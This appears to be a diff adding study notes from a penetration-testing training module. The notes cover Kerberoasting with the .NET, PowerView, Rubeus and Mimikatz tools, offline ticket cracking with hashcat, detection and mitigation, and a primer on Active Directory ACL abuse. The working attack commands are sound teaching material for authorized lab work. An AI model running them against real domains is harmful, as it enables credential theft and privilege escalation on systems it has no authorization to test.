+### 2. Request a Ticket for One SPN
+
+```powershell
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+```
+
+`Add-Type` loads the required .NET assembly. `KerberosRequestorSecurityToken` requests a TGS for the supplied SPN and places it in the current logon session.
+
+### 3. Request Tickets from Enumerated SPNs
+
+```powershell
+setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+```
+
+This is less selective because it also requests tickets for computer-backed SPNs.
+
+### 4. Export Cached Tickets with Mimikatz
+
+```text
+base64 /out:true
+kerberos::list /export
+```
+
+With Base64 output enabled, Mimikatz prints each exported ticket as a Base64 blob. Without it, `kerberos::list /export` writes `.kirbi` files to disk.
+
+### 5. Rebuild a `.kirbi` File from Base64
+
+Remove line breaks from the copied blob:
+
+```bash
+echo "<base64_blob>" | tr -d '\n'
+```
+
+Save the single-line output in a file, then decode it:
+
+```bash
+cat encoded_file | base64 -d > sqldev.kirbi
+```
+
+### 6. Convert the Ticket
+
+```bash
+python2.7 kirbi2john.py sqldev.kirbi
+```
+
+The version used in the module creates a file named `crack_file`. Convert its output to the expected etype 23 format:
+
+```bash
+sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*\$\2/' crack_file > sqldev_tgs_hashcat
+```
+
+### 7. Test an RC4 Ticket Offline
+
+```bash
+hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
+```
+
+Hashcat mode `13100` is used for Kerberos 5 TGS-REP etype 23, or RC4.
+
+## PowerView Method
+
+### Import PowerView and Enumerate SPN Users
+
+```powershell
+Import-Module .\PowerView.ps1
+Get-DomainUser * -spn | select samaccountname
+```
+
+### Request a Ticket for One User
+
+```powershell
+Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+```
+
+### Export All Results to CSV
+
+```powershell
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+```
+
+PowerView can output TGS material directly in Hashcat format, avoiding the `.kirbi` conversion process.
+
+## Rubeus Method
+
+### Show Kerberoastable Account Statistics
+
+```powershell
+.\Rubeus.exe kerberoast /stats
+```
+
+This lists useful information without requesting tickets, including the number of accounts, supported encryption types, and password-last-set years.
+
+### Target One User
+
+```powershell
+.\Rubeus.exe kerberoast /user:testspn /nowrap
+```
+
+### Write Results to a File
+
+```powershell
+.\Rubeus.exe kerberoast /outfile:hashes.txt
+```
+
+### Limit Results with an LDAP Filter
+
+```powershell
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+```
+
+`/nowrap` keeps output on one line, which makes it easier to save for offline testing. An `admincount=1` filter can identify potentially high-value accounts, but the attribute is not definitive proof that an account is currently privileged.
+
+### Other Options Mentioned in the Section
+
+- `/stats`: List statistics without sending ticket requests.
+- `/user:USER`: Select one account.
+- `/spn:"service/host"`: Select one SPN.
+- `/outfile:FILE`: Save output to a file.
+- `/simple`: Print file-style output to the console.
+- `/creduser` and `/credpassword`: Use alternate credentials.
+- `/delay` and `/jitter`: Space out requests.
+- `/resultlimit`: Limit the number of results.
+- `/aes`: Request AES tickets.
+- `/nowrap`: Prevent wrapped output.
+- `/tgtdeleg`: In some older environments, request RC4-only service tickets.
+
+## Encryption Types
+
+- **RC4, etype 23:** Hashes commonly begin with `$krb5tgs$23$`. They are substantially faster to test offline.
+- **AES128, etype 17:** Stronger and slower to test.
+- **AES256, etype 18:** Hashes begin with `$krb5tgs$18$` and are substantially slower to test than RC4.
+
+Check an account's configured encryption types with PowerView:
+
+```powershell
+Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+```
+
+In the module examples:
+
+- `msDS-SupportedEncryptionTypes = 0` means no explicit type is defined and RC4 is used by default in that setup.
+- `msDS-SupportedEncryptionTypes = 24` indicates AES128 and AES256 support.
+
+Use Hashcat mode `19700` for an AES256 TGS-REP:
+
+```bash
+hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
+```
+
+The section notes that the `/tgtdeleg` RC4 downgrade behavior does not work against Windows Server 2019 domain controllers in the demonstrated scenario. Such controllers return a ticket using the strongest encryption type supported by the target account.
+
+## Detection
+
+Enable **Audit Kerberos Service Ticket Operations** on domain controllers and monitor:
+
+- **Event ID 4769:** A Kerberos service ticket was requested.
+- **Event ID 4770:** A Kerberos service ticket was renewed.
+
+Possible indicators include:
+
+- Many TGS requests from one account in a short period.
+- Requests for numerous service accounts in rapid succession.
+- Unexpected RC4 ticket requests, shown as ticket encryption type `0x17` in the module example.
+
+Normal request volume depends on the environment, so detections should use an established baseline rather than a universal fixed threshold.
+
+## Mitigation
+
+- Use long, random passwords or passphrases for traditional service accounts.
+- Prefer Managed Service Accounts and Group Managed Service Accounts.
+- Rotate service-account passwords regularly.
+- Avoid assigning SPNs to highly privileged accounts.
+- Restrict RC4 where compatibility testing shows it is safe.
+- Monitor Event IDs 4769 and 4770 for anomalies.
+- Test encryption-policy changes before deployment because disabling an encryption type can break legacy services.
+
+## Quick Reference
+
+```cmd
+:: Enumerate domain SPNs
+setspn.exe -Q */*
+```
+
+```powershell
+# Request a ticket for one SPN
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
+
+# PowerView enumeration and ticket request
+Import-Module .\PowerView.ps1
+Get-DomainUser * -spn | select samaccountname
+Get-DomainUser -Identity <USER> | Get-DomainSPNTicket -Format Hashcat
+
+# Rubeus statistics and a targeted request
+.\Rubeus.exe kerberoast /stats
+.\Rubeus.exe kerberoast /user:<USER> /nowrap
+```
+
+```bash
+# Decode and convert an exported ticket
+cat encoded_file | base64 -d > ticket.kirbi
+python2.7 kirbi2john.py ticket.kirbi
+
+# Hashcat modes from the section
+hashcat -m 13100 rc4_hashes wordlist.txt
+hashcat -m 19700 aes256_hashes wordlist.txt
+```
+
+# Access Control List (ACL) Abuse Primer
+
+> Use only in authorized labs and assessments. Some ACL operations modify Active Directory and can be destructive.
+
+## Core Concepts
+
+An **Access Control List (ACL)** defines:
+
+1. Which security principal can access an object.
+2. What level of access that principal has.
+
+A security principal can be a **user, group, computer, or process**. Every Active Directory object has an ACL containing one or more **Access Control Entries (ACEs)**.
+
+A small ACL misconfiguration can give an unintended principal control over users, groups, computers, or other AD objects. This may enable lateral movement, privilege escalation, or persistence.
+
+## ACL Types
+
+### DACL: Discretionary Access Control List
+
+Defines which principals are **allowed or denied** access to an object.
+
+- A missing DACL grants full access to everyone.
+- An existing but empty DACL denies access to everyone.
+- DACLs contain allow and deny ACEs.
+
+### SACL: System Access Control List
+
+Defines which access attempts should be audited. SACL entries generate security logs when specified operations are attempted.
+
+## ACE Types
+
+- **Access allowed ACE:** explicitly grants access.
+- **Access denied ACE:** explicitly denies access.
+- **System audit ACE:** records access attempts through the SACL.
+
+Each ACE contains:
+
+1. The SID of the user or group.
+2. The ACE type: allow, deny, or audit.
+3. Inheritance flags for child objects.
+4. A 32-bit access mask defining the granted rights.
+
+ACL entries are evaluated in order. Explicit deny entries can override otherwise granted access, so ACE order and inheritance matter.
+
+## Important AD Rights
+
+### ForceChangePassword
+
+Allows the principal to reset a target user's password without knowing the current password.
+
+Associated PowerView command:
+
+```powershell
+Set-DomainUserPassword
+```
+
+Use cautiously because resetting a password can disrupt services or user access.
+
+### Add Members
+
+Allows the principal to add users to a group.
+
+```powershell
+Add-DomainGroupMember
+```
+
+This becomes dangerous when the target group is privileged or provides access to sensitive resources.
+
+### GenericAll
+
+Provides full control over the target object.
+
+Depending on the object type, it may allow password resets, group-membership changes, attribute modification, targeted Kerberoasting, or access to attributes such as a LAPS-managed password.
+
+```powershell
+Set-DomainUserPassword
+Add-DomainGroupMember
+```
+
+### GenericWrite
+
+Allows modification of non-protected attributes on an object.
+
+```powershell
+Set-DomainObject
+```
+
+Possible impact depends on the object:
+
+- **User:** modify attributes, potentially including assigning an SPN.
+- **Group:** modify group-related attributes or membership where permitted.
+- **Computer:** may expose delegation-related attack paths.
+
+### WriteOwner
+
+Allows changing the owner of an object.
+
+```powershell
+Set-DomainObjectOwner
+```
+
+Object owners can normally modify the object's permissions, making this an indirect path to greater control.
+
+### WriteDACL
+
+Allows modification of the target object's DACL.
+
+```powershell
+Add-DomainObjectACL
+```
+
+This can be used to grant another principal additional rights over the object.
+
+### AllExtendedRights
+
+Grants all extended rights on the target object. Depending on the object, this may include password-reset or group-management capabilities.
+
+```powershell
+Set-DomainUserPassword
+Add-DomainGroupMember
+```
+
+### AddSelf
+
+Allows a user to add their own account to a specific group.
+
+```powershell
+Add-DomainGroupMember
+```
+
+## Main Rights Covered in the Module
+
+The module focuses on four ACEs:
+
+1. **ForceChangePassword:** reset a user's password without knowing it.
+2. **GenericWrite:** modify non-protected object attributes.
+3. **AddSelf:** add the controlled account to an allowed group.
+4. **GenericAll:** obtain full control over the target object.
+
+Always interpret a right in relation to its **target object type**. The same permission can have different effects over a user, group, or computer.
+
+## Enumeration and Visualization
+
+Useful tools include:
+
+- **BloodHound:** visualizes relationships and ACL attack paths as graph edges.
+- **PowerView:** enumerates permissions and provides commands for authorized AD testing.
+- **Active Directory Users and Computers (ADUC):** displays permissions graphically under Advanced Security Settings.
+- **Auditing tab in ADUC:** displays SACL entries.
+
+When reviewing an ACE, identify:
+
+```text
+Principal -> ACE type -> Inheritance -> Granted right -> Target object
+```
+
+Also check whether control is inherited, directly assigned, or obtained through group membership.
+
+## Other Interesting Rights
+
+Less common BloodHound edges and AD extended rights may also expose attack paths, for example:
+
+- **ReadGMSAPassword:** permits reading a gMSA-managed password.
+- **Unexpire-Password:** permits removing password expiration state.
+- **Reanimate-Tombstones:** permits restoring deleted AD objects.
+
+The correct methodology is to identify the controlled principal, target object, exact right, inheritance scope, and possible impact before taking action.
+
+## Common Real-World Scenarios
+
+### Password-reset delegation
+
+Help Desk personnel commonly receive password-reset rights. Compromising such an account may expose other users whose passwords it is authorized to reset.
+
+### Group-membership management
+
+An account may be allowed to add or remove group members. The impact depends on what privileges or resource access the target group provides.
+
+### Excessive or forgotten rights
+
+Legacy configurations, software installations, troubleshooting changes, and accidental delegation may leave users or groups with unnecessary control over AD objects.
+
+## Assessment Safety
+
+ACL abuse may change passwords, group memberships, ownership, attributes, or permissions. These actions can interrupt services or lock out users.
+
+Before making changes:
+
+1. Confirm the action is in scope and authorized.
+2. Record the original object state.
+3. Prefer the least disruptive validation method.
+4. Document every modification.
+5. Revert all changes after testing.
+6. Clearly report what was changed and how it was restored.
+
+## Quick Recall
+
+```text
+ACL                 List of permissions on an object
+ACE                 One permission entry inside an ACL
+DACL                Allows or denies access
+SACL                Controls auditing
+ForceChangePassword Reset a user's password
+Add Members         Add accounts to a group
+GenericWrite        Modify non-protected attributes
+GenericAll          Full control over an object
+WriteOwner          Change object ownership
+WriteDACL           Modify object permissions
+AddSelf             Add yourself to an allowed group
+BloodHound          Visualize ACL relationships
+PowerView           Enumerate and test AD permissions
+Main outcomes       Lateral movement, privilege escalation, persistence
+```
+
+## Exam Takeaway
+
+For every ACL finding, determine **who controls what, through which ACE, over which target type, and with what inheritance**. ACL paths are often missed by vulnerability scanners, so BloodHound, PowerView, and manual AD inspection are important for finding unintended privilege relationships.
